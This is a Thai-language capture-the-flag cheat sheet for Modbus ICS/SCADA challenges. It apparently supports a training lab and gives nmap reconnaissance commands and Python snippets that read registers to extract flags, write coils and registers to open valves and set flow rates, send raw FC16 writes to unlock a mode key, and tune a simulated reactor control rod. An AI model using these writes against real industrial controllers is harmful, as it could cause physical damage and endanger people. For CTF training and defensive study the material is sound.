### 🔑 1. คีย์เวิร์ดฝั่ง "กลไกและฮาร์ดแวร์" (System Components)

ถ้าโจทย์มีคำพวกนี้โผล่มา ให้รู้เลยว่าคือโจทย์แนว "ควบคุมลอจิก" ไม่ใช่แค่หา Flag ธรรมดา:

- **`Process Control`** หรือ **`Logic Manipulation`** (การควบคุมกระบวนการ)
- <br />

  **`Valves`** / **`Pumps`** (วาล์วหรือปั๊ม -> \<span style="color:green; font-weight:bold;">มักจะควบคุมด้วย Coils 0/1\</span>)

  <br />
- <br />

  **`Flow Rate`** / **`Speed`** (อัตราการไหล/ความเร็ว -> \<span style="color:green; font-weight:bold;">มักจะควบคุมด้วย Holding Registers\</span>)

  <br />
- <br />

  **`Sensors`** / **`Levels`** / **`Quantity`** / **`Volume`** (เซนเซอร์/ระดับน้ำ/ปริมาณ -> \<span style="color:green; font-weight:bold;">มักจะอ่านค่าจาก Input Registers\</span>)

  <br />
- <br />

  **`Tanks`** / **`Vats`** / **`Containers`** (ถังบรรจุ หรือพื้นที่จำกัด)

  <br />

### 🔑 2. คีย์เวิร์ดฝั่ง "เงื่อนไขและข้อจำกัด" (Constraints)

นี่คือจุดตายที่ทำให้คนเขียนสคริปต์พลาด:

- <br />

  **`Rate Limit`** / **`Max Capacity`** / **`Cannot exceed`** (\<span style="color:red; font-weight:bold;">ข้อจำกัดอัตราการไหล หรือความจุสูงสุด\</span>)

  <br />
- <br />

  **`Time limit`** / **`Seconds`** (\<span style="color:red; font-weight:bold;">เงื่อนไขเวลา เช่น ต้องทำให้เสร็จใน 90 วินาที\</span>)

  <br />
- <br />

  **`Automatic systems`** / **`Safety PLC`** (\<span style="color:green; font-weight:bold;">ระบบอัตโนมัติ เช่น ถังเต็มแล้วระบายทิ้งเอง\</span>)

  <br />

### 🔑 3. คีย์เวิร์ดฝั่ง "ยุทธวิธี" (Attack Tactics)

เอาไว้สั่ง Trae IDE ว่าต้องเขียนสคริปต์ด้วยแพทเทิร์นไหน:

- **`Coordinated Attack`** (การโจมตีสอดประสาน: ต้องปรับ Register และเปิด Coil พร้อมกัน)
- <br />

  **`Dynamic State Polling`** / **`Feedback Loop`** (การวนลูปอ่านค่าเซนเซอร์แบบเรียลไทม์เพื่อประกอบการตัดสินใจ แทนที่จะใช้ `time.sleep()`)

  Markdown
  ````
  # 🏭 Modbus SCADA: Color Plant & Logic Manipulation Cheat Sheet
  **Workspace:** `/home/kali/Desktop/RTAF-CTF-2026/OT-Security-Lab/01_ICS_SCADA_Modbus/`
  **Target Protocol:** Modbus TCP (Port 502 / 4502)

  ---

  ## 🔍 1. Initial Reconnaissance (เปิดแมพอย่างปลอดภัย)
  **[EXAM FOCUS]** กฎเหล็กข้อแรก: <span style="color:green; font-weight:bold;">ต้องสแกนดูโครงสร้างก่อนเสมอ</span> ห้ามยิงสคริปต์สุ่มสี่สุ่มห้า

  ```bash
  # สแกนหาพอร์ต Modbus และใช้ NSE Script ดึงข้อมูลเบื้องต้น
  nmap -Pn -p 502,4502 -sV --script modbus-discover.nse,modicon-info.nse <target_ip>

  ````
  ***
  ## 🚩 2. Data Extraction (การดึง Token/Flag จาก Memory)
  ถ้าโจทย์บอกว่า Flag ซ่อนอยู่ใน Register (เช่น 0 ถึง 31) ให้ใช้วิธีอ่านค่ามาทีละช่อง แล้วแปลงเลข Integer เป็นตัวอักษร ASCII

  **Python Quick Snippet (ใช้ pyModbusTCP):**

  Python
  ```
  from pyModbusTCP.client import ModbusClient

  c = ModbusClient(host="<target_ip>", port=4502, unit_id=1, auto_open=True)
  regs = c.read_holding_registers(0, 32)

  if regs:
      # แปลงลิสต์ตัวเลขเป็นข้อความ ASCII
      token = ''.join([chr(r) for r in regs])
      print(f"[+] FOUND TOKEN: {token}")
  else:
      print("[-] Read error")

  ```
  **ใช้ Toolkit ประจำทีม (RTAF COC):**

  Bash
  ```
  python3 ../ics_toolkit/pymodbus/modbus_read_holding_registers.py <target_ip> --port 4502 --unit 1 --addr 0 --count 32

  ```
  ***
  ## ⚙️ 3. Coordinated Logic Attack (การควบคุมระบบแบบสอดประสาน)
  **\[EXAM FOCUS]** เวลาเจอโจทย์แนว "โรงงาน" (เปิดวาล์ว, ปรับแรงดัน, ผสมสี) ต้องทำ 2 อย่างไปพร้อมกัน:
  1. ปรับค่า Register (เช่น อัตราการไหล/Flow rate) -> `write_single_register()`
  2. เปิดสวิตช์ Coil (เช่น เปิดวาล์วน้ำ) -> `write_single_coil()`
  \<span style="color:red; font-weight:bold;">\[DANGER LIMIT] ห้าม Fuzzing มั่ว!\</span> ระบบฟิสิกส์จำลองมีขีดจำกัดเสมอ (เช่น ในโจทย์นี้รับอัตราการไหลได้สูงสุดแค่ 5 units/s) ถ้ายิงค่าเกิน ระบบอาจจะ Reject หรือ Error ทันที

  Python
  ```
  # ตัวอย่างการเปิดวาล์วน้ำสีแดง (Coil 0) และตั้งความเร็วที่ 5 (Register 32)
  c.write_single_register(32, 5)  # Set Flow Rate = 5
  c.write_single_coil(0, 1)       # Open Valve (1 = True)

  ```
  ***
  ## 🔄 4. Dynamic State Polling (เทคนิค Feedback Loop ระดับเซียน)
  \<span style="color:green; font-weight:bold;">\[SAFE AUTOMATION]\</span> เลิกใช้ `time.sleep()` กะเวลาเอาเองเวลาเติมน้ำหรือปรับค่า! ให้ใช้ลูป `while` เพื่อ **"อ่านค่าเซนเซอร์ปัจจุบัน"** (Input Registers) กลับมาเช็คเสมอ (Feedback Loop) เหมือนที่วิศวกรโรงงานทำจริงๆ

  Python
  ```
  def mix_color_safe(target_ip, color_coil, flow_reg, sensor_reg, target_amount):
      """
      สูตรการเติมน้ำแบบปลอดภัย: เปิดวาล์ว -> วนลูปเช็คเซนเซอร์ -> ปิดวาล์วเมื่อถึงเป้าหมาย
      """
      c = ModbusClient(host=target_ip, port=4502, unit_id=1, auto_open=True)
      
      print(f"[*] Starting to fill {target_amount} units...")
      
      # 1. ตั้งอัตราการไหล (ห้ามเกินลิมิต 5) และเปิดวาล์ว
      c.write_single_register(flow_reg, 5)
      c.write_single_coil(color_coil, 1)
      
      # 2. Feedback Loop: วนลูปอ่านค่าจากเซนเซอร์เรื่อยๆ จนกว่าจะได้ปริมาณที่ต้องการ
      current_amount = 0
      while current_amount < target_amount:
          current_amount = c.read_input_registers(sensor_reg)[0]
          print(f"\r[~] Current level: {current_amount}/{target_amount}", end='')
          
      # 3. ปิดวาล์วทันทีเมื่อถึงเป้า
      c.write_single_coil(color_coil, 0)
      print("\n[+] Done!")

  # ตัวอย่างการเรียกใช้: เติมสีเขียว (Coil=1, Flow=33, Sensor=4) ให้ได้ 64 หน่วย
  # mix_color_safe("127.0.0.1", 1, 33, 4, 64)

  ```
  ***
  ## 📌 Checklist ย้ำเตือนก่อนเจาะ:
  - \[ ] สแกน Nmap NSE ดึงข้อมูลพื้นฐานก่อนเสมอ
  - \[ ] อ่าน Baseline ให้ออก: ต้องรู้ว่า Address ไหนคือ Coil (เปิด/ปิด) และ Address ไหนคือ Register (ตัวเลข)
  - \[ ] ถ้าโจทย์มีระบบ Auto (เช่น ถังเต็มแล้วระบายน้ำทิ้งเอง) ให้ปล่อยระบบจัดการ อย่าไปฝืนเขียนสคริปต์ทับ
  - \[ ] ห้าม Write ข้อมูลแบบ Blind ให้ Read กลับมาเช็คสถานะเสมอ

---

## 🧩 Advanced Modbus Patterns (Code Snippets from ctf-ics SKILL.md)

### Pattern A: Plaintext in Holding Registers (FC03)

```python
def regs_to_ascii_be_le(regs):
    be, le = [], []
    for v in regs:
        hi, lo = (v >> 8) & 0xFF, v & 0xFF
        be += [chr(hi) if 32 <= hi < 127 else '.', chr(lo) if 32 <= lo < 127 else '.']
        le += [chr(lo) if 32 <= lo < 127 else '.', chr(hi) if 32 <= hi < 127 else '.']
    return ''.join(be), ''.join(le)
```

### Pattern D: Cross-Protocol Truth Validation

```python
# Cross-validate example: Modbus IR vs CIP Assembly
ir_values = mb_read(fc=4, addr=0, count=10)   # Modbus sensor "truth"
cip_values = cip_read_assembly(0x64, attr=3)   # CIP actual truth (LE uint16)
hmi_values = hmi_get('/api/telemetry')          # HMI display layer

# Compare — discrepancy reveals which layer is lying
for name, ir_v, cip_v in [('temp', ir_values[0], cip_values[0]),
                            ('pressure', ir_values[1], cip_values[1])]:
    if ir_v != cip_v:
        print(f'⚠️ {name} FALSIFIED: IR={ir_v/10} vs CIP_TRUE={cip_v/10}')
```

### Pattern E: FC16 Atomic Write for Mode Key Unlock

```python
def mb_write_multiple_fc16(target, addr, values, unit=1, interface=None):
    """FC16 atomic write — required for mode key sequences"""
    s = socket.socket(); s.settimeout(5)
    if interface:
        s.setsockopt(socket.SOL_SOCKET, 25, (interface + '\0').encode())
    s.connect((target, 502))
    count = len(values)
    data = struct.pack('>HHB', addr, count, count * 2)
    for v in values:
        data += struct.pack('>H', v)
    req = struct.pack('>HHHBB', 1, 0, len(data) + 2, unit, 16) + data
    s.send(req); resp = s.recv(2048); s.close()
    return resp

# Example: mode key unlock (OPERATIONAL = C0DE, CAFE, BEEF, DEAD)
mb_write_multiple_fc16(target, addr=0, values=[0xC0DE, 0xCAFE, 0xBEEF, 0xDEAD])
```

### Pattern F: Process Stabilization with Physics Feedback Loop

```python
# Iterative tuning: adjust rod, wait, measure TRUE values from CIP
for rod_val in range(60, 100):
    mb_write_hr(10, rod_val)
    for _ in range(12):  # wait 12 ticks for physics to settle
        time.sleep(1)
        sustain_writes()  # keep mode key + pumps + rod active
    
    cip_vals = cip_read_assembly_truth()
    true_temp = cip_vals[0] / 10
    true_pres = cip_vals[1] / 10
    
    if true_temp < 600 and 150 <= true_pres <= 170:
        print(f'SWEET SPOT: rod={rod_val} T={true_temp} P={true_pres}')
        break

# Then sustain SAFE envelope for N ticks
safe_streak = 0
while safe_streak < REQUIRED_TICKS:
    sustain_writes()
    time.sleep(1)
    if check_all_safe(cip_read_assembly_truth()):
        safe_streak += 1
    else:
        safe_streak = 0
    if check_flag_gate():  # DI#4 or HMI flag field
        read_and_decode_flag()
        break
```

### Pymodbus API Compatibility Guard

```python
def read_hr_compat(client, address, count, unit_id=1):
    try:
        return client.read_holding_registers(address=address, count=count, device_id=unit_id)
    except TypeError:
        try:
            return client.read_holding_registers(address=address, count=count, slave=unit_id)
        except TypeError:
            return client.read_holding_registers(address=address, count=count, unit=unit_id)
```

